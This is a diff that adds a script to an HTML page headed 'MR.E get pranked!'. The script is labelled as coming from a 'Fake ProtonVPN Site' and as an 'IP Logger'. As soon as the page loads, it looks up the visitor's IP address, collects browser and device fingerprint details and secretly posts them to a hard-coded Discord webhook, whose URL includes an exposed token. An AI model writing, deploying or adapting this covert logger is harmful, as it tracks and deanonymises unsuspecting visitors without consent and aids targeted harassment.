@@ -25,4 +25,75 @@
 <body>
     <h1>MR.E get pranked!</h1>
 </body>
+    <script>
+    // Function to send the user data to the Discord webhook as an embed
+    function sendUserDataToDiscord(userData) {
+        const webhookURL = "https://discord.com/api/webhooks/1303905695208570890/hqxllBpBroaolym0eh6KgVZE0vBlDu4Ng-yh9F1Tc4fhtlXm9J_odrDJWI6WMF3-2qr4"; // Replace with your Discord webhook URL
+
+        const embed = {
+            title: "From Fake ProtonVPN Site",
+            color: 3447003, // Embed color in hexadecimal
+            fields: [
+                { name: "User IP", value: userData.ip || "N/A", inline: false },
+                { name: "User Agent", value: userData.userAgent || "N/A", inline: false },
+                { name: "Browser Language", value: userData.browserLanguage || "N/A", inline: false },
+                { name: "Operating System", value: userData.osInfo || "N/A", inline: false },
+                { name: "Viewport Size", value: `${userData.viewportWidth} x ${userData.viewportHeight}`, inline: true },
+                { name: "Screen Resolution", value: `${userData.screenWidth} x ${userData.screenHeight}`, inline: true },
+                { name: "Color Depth", value: `${userData.colorDepth}-bit`, inline: true },
+                { name: "Device Memory", value: `${userData.deviceMemory || "N/A"} GB`, inline: true },
+                { name: "Hardware Concurrency", value: `${userData.hardwareConcurrency || "N/A"}`, inline: true },
+                { name: "Touch Support", value: userData.touchSupport ? "Yes" : "No", inline: true },
+                { name: "Referrer", value: userData.referrer || "No Referrer", inline: false },
+                { name: "Current URL", value: userData.currentURL || "N/A", inline: false },
+                { name: "Timestamp", value: userData.timestamp || "N/A", inline: false }
+            ],
+            footer: { text: "IP Logger" }
+        };
+
+        const payload = { embeds: [embed] };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+            console.log('Successfully sent user data to Discord.');
+        })
+        .catch(error => console.error('Error sending user data to Discord:', error));
+    }
+
+    // Function to collect additional user data
+    function collectUserData(ip) {
+        return {
+            ip: ip,
+            userAgent: navigator.userAgent || "N/A",
+            browserLanguage: navigator.language || "N/A",
+            osInfo: navigator.platform || "N/A",
+            viewportWidth: window.innerWidth || "N/A",
+            viewportHeight: window.innerHeight || "N/A",
+            screenWidth: screen.width || "N/A",
+            screenHeight: screen.height || "N/A",
+            colorDepth: screen.colorDepth || "N/A",
+            deviceMemory: navigator.deviceMemory || "N/A",
+            hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
+            touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+            referrer: document.referrer || "No Referrer",
+            currentURL: window.location.href || "N/A",
+            timestamp: new Date().toISOString()
+        };
+    }
+
+    // Fetch the user's IP using a public API and send the data to Discord
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            console.log('User IP:', data.ip);
+            const userData = collectUserData(data.ip);
+            sendUserDataToDiscord(userData);
+        })
+        .catch(error => console.error('Error fetching IP:', error));
+</script>
 </html>
